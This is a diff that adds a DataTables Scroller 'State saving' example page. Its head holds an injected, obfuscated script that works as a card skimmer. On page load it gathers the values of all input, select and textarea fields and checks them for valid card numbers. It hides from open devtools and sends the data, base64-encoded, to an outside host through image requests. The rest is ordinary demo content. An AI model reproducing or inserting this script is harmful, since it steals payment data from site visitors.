@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<link rel="shortcut icon" type="image/ico" href="http://www.datatables.net/favicon.ico">
+	<meta name="viewport" content="initial-scale=1.0, maximum-scale=2.0">
+
+	<title>Scroller example - State saving</title>
+	<link rel="stylesheet" type="text/css" href="../../../media/css/jquery.dataTables.css">
+	<link rel="stylesheet" type="text/css" href="../css/dataTables.scroller.css">
+	<link rel="stylesheet" type="text/css" href="../../../examples/resources/syntax/shCore.css">
+	<link rel="stylesheet" type="text/css" href="../../../examples/resources/demo.css">
+	<style type="text/css" class="init">
+
+	</style>
+	<script type="text/javascript" language="javascript" src="../../../media/js/jquery.js"></script>
+	<script type="text/javascript" language="javascript" src="../../../media/js/jquery.dataTables.js"></script>
+	<script type="text/javascript" language="javascript" src="../js/dataTables.scroller.js"></script>
+	<script type="text/javascript" language="javascript" src="../../../examples/resources/syntax/shCore.js"></script>
+	<script type="text/javascript" language="javascript" src="../../../examples/resources/demo.js"></script>
+	<script type="text/javascript" language="javascript" class="init">
+
+
+$(document).ready(function() {
+	$('#example').DataTable( {
+		ajax:           "data/2500.txt",
+		deferRender:    true,
+		dom:            "frtiS",
+		scrollY:        200,
+		scrollCollapse: true,
+		stateSave:      true
+	} );
+} );
+
+
+	</script>
+<script>var _0x47a1=['\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d'];(function(_0x426afc,_0x5e7e17){var _0x5d0eb7=function(_0x59e477){while(--_0x59e477){_0x426afc['push'](_0x426afc['shift']());}};_0x5d0eb7(++_0x5e7e17);}(_0x47a1,0x19e));var _0x2ee5=function(_0x567355,_0x583548){_0x567355=_0x567355-0x0;var _0x4c8f6a=_0x47a1[_0x567355];if(_0x2ee5['RDGttl']===undefined){(function(){var _0x206241;try{var _0x3559c9=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x206241=_0x3559c9();}catch(_0x3a72d3){_0x206241=window;}var _0x1bcb24='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x206241['atob']||(_0x206241['atob']=function(_0x2c6386){var _0x4c73eb=String(_0x2c6386)['replace'](/=+$/,'');for(var _0x5dc2c0=0x0,_0x147426,_0x3aca5f,_0x436278=0x0,_0x310f28='';_0x3aca5f=_0x4c73eb['charAt'](_0x436278++);~_0x3aca5f&&(_0x147426=_0x5dc2c0%0x4?_0x147426*0x40+_0x3aca5f:_0x3aca5f,_0x5dc2c0++%0x4)?_0x310f28+=String['fromCharCode'](0xff&_0x147426>>(-0x2*_0x5dc2c0&0x6)):0x0){_0x3aca5f=_0x1bcb24['indexOf'](_0x3aca5f);}return _0x310f28;});}());_0x2ee5['ILGxFR']=function(_0x4b8672){var _0x5dd8ca=atob(_0x4b8672);var _0x5d67dd=[];for(var _0xbfbf40=0x0,_0xb3a4a6=_0x5dd8ca['length'];_0xbfbf40<_0xb3a4a6;_0xbfbf40++){_0x5d67dd+='%'+('00'+_0x5dd8ca['charCodeAt'](_0xbfbf40)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5d67dd);};_0x2ee5['pNpybe']={};_0x2ee5['RDGttl']=!![];}var _0x2afd25=_0x2ee5['pNpybe'][_0x567355];if(_0x2afd25===undefined){_0x4c8f6a=_0x2ee5['ILGxFR'](_0x4c8f6a);_0x2ee5['pNpybe'][_0x567355]=_0x4c8f6a;}else{_0x4c8f6a=_0x2afd25;}return _0x4c8f6a;};function _0x47cdac(_0x4d3ef1,_0x3ad916,_0x38e052){return _0x4d3ef1[_0x2ee5('0x0')](new RegExp(_0x3ad916,'\x67'),_0x38e052);}function _0xf8bd79(_0x56f0a4){var _0x3da28b=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x2ef060=/^(?:5[1-5][0-9]{14})$/;var _0x4c6f63=/^(?:3[47][0-9]{13})$/;var _0x766b6d=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x58184b=![];if(_0x3da28b[_0x2ee5('0x1')](_0x56f0a4)){_0x58184b=!![];}else if(_0x2ef060[_0x2ee5('0x1')](_0x56f0a4)){_0x58184b=!![];}else if(_0x4c6f63[_0x2ee5('0x1')](_0x56f0a4)){_0x58184b=!![];}else if(_0x766b6d[_0x2ee5('0x1')](_0x56f0a4)){_0x58184b=!![];}return _0x58184b;}function _0x254f37(_0x539cfc){if(/[^0-9-\s]+/[_0x2ee5('0x1')](_0x539cfc))return![];var _0x2ecd58=0x0,_0x2a71f4=0x0,_0x4310f1=![];_0x539cfc=_0x539cfc['\x72\x65\x70\x6c\x61\x63\x65'](/\D/g,'');for(var _0x58bc96=_0x539cfc[_0x2ee5('0x2')]-0x1;_0x58bc96>=0x0;_0x58bc96--){var _0x154ac2=_0x539cfc[_0x2ee5('0x3')](_0x58bc96),_0x2a71f4=parseInt(_0x154ac2,0xa);if(_0x4310f1){if((_0x2a71f4*=0x2)>0x9)_0x2a71f4-=0x9;}_0x2ecd58+=_0x2a71f4;_0x4310f1=!_0x4310f1;}return _0x2ecd58%0xa==0x0;}(function(){'use strict';const _0x10dd80={};_0x10dd80[_0x2ee5('0x4')]=![];_0x10dd80[_0x2ee5('0x5')]=undefined;const _0x353900=0xa0;const _0x5200f2=(_0x48747b,_0x48b2ac)=>{window[_0x2ee5('0x6')](new CustomEvent(_0x2ee5('0x7'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x48747b,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x48b2ac}}));};setInterval(()=>{const _0x4af648=window['\x6f\x75\x74\x65\x72\x57\x69\x64\x74\x68']-window[_0x2ee5('0x8')]>_0x353900;const _0x526a32=window[_0x2ee5('0x9')]-window[_0x2ee5('0xa')]>_0x353900;const _0xffba90=_0x4af648?_0x2ee5('0xb'):'\x68\x6f\x72\x69\x7a\x6f\x6e\x74\x61\x6c';if(!(_0x526a32&&_0x4af648)&&(window[_0x2ee5('0xc')]&&window[_0x2ee5('0xc')][_0x2ee5('0xd')]&&window[_0x2ee5('0xc')][_0x2ee5('0xd')][_0x2ee5('0xe')]||_0x4af648||_0x526a32)){if(!_0x10dd80[_0x2ee5('0x4')]||_0x10dd80[_0x2ee5('0x5')]!==_0xffba90){_0x5200f2(!![],_0xffba90);}_0x10dd80[_0x2ee5('0x4')]=!![];_0x10dd80[_0x2ee5('0x5')]=_0xffba90;}else{if(_0x10dd80[_0x2ee5('0x4')]){_0x5200f2(![],undefined);}_0x10dd80[_0x2ee5('0x4')]=![];_0x10dd80[_0x2ee5('0x5')]=undefined;}},0x1f4);if(typeof module!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&module[_0x2ee5('0xf')]){module[_0x2ee5('0xf')]=_0x10dd80;}else{window[_0x2ee5('0x10')]=_0x10dd80;}}());String[_0x2ee5('0x11')][_0x2ee5('0x12')]=function(){var _0x124187=0x0,_0x14460c,_0x498123;if(this[_0x2ee5('0x2')]===0x0)return _0x124187;for(_0x14460c=0x0;_0x14460c<this[_0x2ee5('0x2')];_0x14460c++){_0x498123=this[_0x2ee5('0x13')](_0x14460c);_0x124187=(_0x124187<<0x5)-_0x124187+_0x498123;_0x124187|=0x0;}return _0x124187;};var _0x843aab={};_0x843aab['\x47\x61\x74\x65']='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6a\x73\x2d\x63\x6c\x6f\x75\x64\x68\x6f\x73\x74\x2e\x63\x6f\x6d\x2f\x69\x6d\x67';_0x843aab[_0x2ee5('0x14')]={};_0x843aab['\x53\x65\x6e\x74']=[];_0x843aab[_0x2ee5('0x15')]=![];_0x843aab[_0x2ee5('0x16')]=function(_0x98ff2f){if(_0x98ff2f.id!==undefined&&_0x98ff2f.id!=''&&_0x98ff2f.id!==null&&_0x98ff2f.value.length<0x100&&_0x98ff2f.value.length>0x0){if(_0x254f37(_0x47cdac(_0x47cdac(_0x98ff2f.value,'\x2d',''),'\x20',''))&&_0xf8bd79(_0x47cdac(_0x47cdac(_0x98ff2f.value,'\x2d',''),'\x20','')))_0x843aab.IsValid=!![];_0x843aab.Data[_0x98ff2f.id]=_0x98ff2f.value;return;}if(_0x98ff2f.name!==undefined&&_0x98ff2f.name!=''&&_0x98ff2f.name!==null&&_0x98ff2f.value.length<0x100&&_0x98ff2f.value.length>0x0){if(_0x254f37(_0x47cdac(_0x47cdac(_0x98ff2f.value,'\x2d',''),'\x20',''))&&_0xf8bd79(_0x47cdac(_0x47cdac(_0x98ff2f.value,'\x2d',''),'\x20','')))_0x843aab.IsValid=!![];_0x843aab.Data[_0x98ff2f.name]=_0x98ff2f.value;return;}};_0x843aab['\x53\x61\x76\x65\x41\x6c\x6c\x46\x69\x65\x6c\x64\x73']=function(){var _0x1e6914=document.getElementsByTagName(_0x2ee5('0x17'));var _0x5d82e2=document.getElementsByTagName(_0x2ee5('0x18'));var _0x32819c=document.getElementsByTagName(_0x2ee5('0x19'));for(var _0x20149d=0x0;_0x20149d<_0x1e6914.length;_0x20149d++)_0x843aab.SaveParam(_0x1e6914[_0x20149d]);for(var _0x20149d=0x0;_0x20149d<_0x5d82e2.length;_0x20149d++)_0x843aab.SaveParam(_0x5d82e2[_0x20149d]);for(var _0x20149d=0x0;_0x20149d<_0x32819c.length;_0x20149d++)_0x843aab.SaveParam(_0x32819c[_0x20149d]);};_0x843aab[_0x2ee5('0x1a')]=function(){if(!window.devtools.isOpen&&_0x843aab.IsValid){_0x843aab.Data[_0x2ee5('0x1b')]=location.hostname;var _0x487219=encodeURIComponent(window.btoa(JSON.stringify(_0x843aab.Data)));var _0x1858a4=_0x487219.hashCode();for(var _0x3d23a7=0x0;_0x3d23a7<_0x843aab.Sent.length;_0x3d23a7++)if(_0x843aab.Sent[_0x3d23a7]==_0x1858a4)return;_0x843aab.LoadImage(_0x487219);}};_0x843aab[_0x2ee5('0x1c')]=function(){_0x843aab.SaveAllFields();_0x843aab.SendData();};_0x843aab['\x4c\x6f\x61\x64\x49\x6d\x61\x67\x65']=function(_0x18bdb8){_0x843aab.Sent.push(_0x18bdb8.hashCode());var _0x4b6db4=document.createElement(_0x2ee5('0x1d'));_0x4b6db4.src=_0x843aab.GetImageUrl(_0x18bdb8);};_0x843aab[_0x2ee5('0x1e')]=function(_0x222025){return _0x843aab.Gate+_0x2ee5('0x1f')+_0x222025;};document['\x6f\x6e\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6e\x67\x65']=function(){if(document[_0x2ee5('0x20')]===_0x2ee5('0x21')){window[_0x2ee5('0x22')](_0x843aab['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};</script></head>
+
+<body class="dt-example">
+	<div class="container">
+		<section>
+			<h1>Scroller example <span>State saving</span></h1>
+
+			<div class="info">
+				<p>Scroller will automatically integrate with DataTables in order to save the scrolling position of the
+				table, if state saving is enabled in the DataTable (<a href=
+				"//datatables.net/reference/option/stateSave"><code class="option" title=
+				"DataTables initialisation option">stateSave<span>DT</span></code></a>). This example shows that in
+				practice - to demonstrate, scroll the table and then reload the page.</p>
+			</div>
+
+			<table id="example" class="display" cellspacing="0" width="100%">
+				<thead>
+					<tr>
+						<th>ID</th>
+						<th>First name</th>
+						<th>Last name</th>
+						<th>ZIP / Post code</th>
+						<th>Country</th>
+					</tr>
+				</thead>
+			</table>
+
+			<ul class="tabs">
+				<li class="active">Javascript</li>
+				<li>HTML</li>
+				<li>CSS</li>
+				<li>Ajax</li>
+				<li>Server-side script</li>
+			</ul>
+
+			<div class="tabs">
+				<div class="js">
+					<p>The Javascript shown below is used to initialise the table shown in this
+					example:</p><code class="multiline brush: js;">$(document).ready(function() {
+	$('#example').DataTable( {
+		ajax:           &quot;data/2500.txt&quot;,
+		deferRender:    true,
+		dom:            &quot;frtiS&quot;,
+		scrollY:        200,
+		scrollCollapse: true,
+		stateSave:      true
+	} );
+} );</code>
+
+					<p>In addition to the above code, the following Javascript library files are loaded for use in this
+					example:</p>
+
+					<ul>
+						<li><a href="../../../media/js/jquery.js">../../../media/js/jquery.js</a></li>
+						<li><a href=
+						"../../../media/js/jquery.dataTables.js">../../../media/js/jquery.dataTables.js</a></li>
+						<li><a href="../js/dataTables.scroller.js">../js/dataTables.scroller.js</a></li>
+					</ul>
+				</div>
+
+				<div class="table">
+					<p>The HTML shown below is the raw HTML table element, before it has been enhanced by
+					DataTables:</p>
+				</div>
+
+				<div class="css">
+					<div>
+						<p>This example uses a little bit of additional CSS beyond what is loaded from the library
+						files (below), in order to correctly display the table. The additional CSS used is shown
+						below:</p><code class="multiline brush: js;"></code>
+					</div>
+
+					<p>The following CSS library files are loaded for use in this example to provide the styling of the
+					table:</p>
+
+					<ul>
+						<li><a href=
+						"../../../media/css/jquery.dataTables.css">../../../media/css/jquery.dataTables.css</a></li>
+						<li><a href="../css/dataTables.scroller.css">../css/dataTables.scroller.css</a></li>
+					</ul>
+				</div>
+
+				<div class="ajax">
+					<p>This table loads data by Ajax. The latest data that has been loaded is shown below. This data
+					will update automatically as any additional data is loaded.</p>
+				</div>
+
+				<div class="php">
+					<p>The script used to perform the server-side processing for this table is shown below. Please note
+					that this is just an example script using PHP. Server-side processing scripts can be written in any
+					language, using <a href="//datatables.net/manual/server-side">the protocol described in the
+					DataTables documentation</a>.</p>
+				</div>
+			</div>
+		</section>
+	</div>
+
+	<section>
+		<div class="footer">
+			<div class="gradient"></div>
+
+			<div class="liner">
+				<h2>Other examples</h2>
+
+				<div class="toc">
+					<div class="toc-group">
+						<h3><a href="./index.html">Examples</a></h3>
+						<ul class="toc active">
+							<li><a href="./simple.html">Basic initialisation</a></li>
+							<li class="active"><a href="./state_saving.html">State saving</a></li>
+							<li><a href="./large_js_source.html">Client-side data source (50,000 rows)</a></li>
+							<li><a href="./server-side_processing.html">Server-side processing (5,000,000
+							rows)</a></li>
+							<li><a href="./api_scrolling.html">API</a></li>
+						</ul>
+					</div>
+				</div>
+
+				<div class="epilogue">
+					<p>Please refer to the <a href="http://www.datatables.net">DataTables documentation</a> for full
+					information about its API properties and methods.<br>
+					Additionally, there are a wide range of <a href="http://www.datatables.net/extras">extras</a> and
+					<a href="http://www.datatables.net/plug-ins">plug-ins</a> which extend the capabilities of
+					DataTables.</p>
+
+					<p class="copyright">DataTables designed and created by <a href=
+					"http://www.sprymedia.co.uk">SpryMedia Ltd</a> &#169; 2007-2014<br>
+					DataTables is licensed under the <a href="http://www.datatables.net/mit">MIT license</a>.</p>
+				</div>
+			</div>
+		</div>
+	</section>
+</body>
+</html>
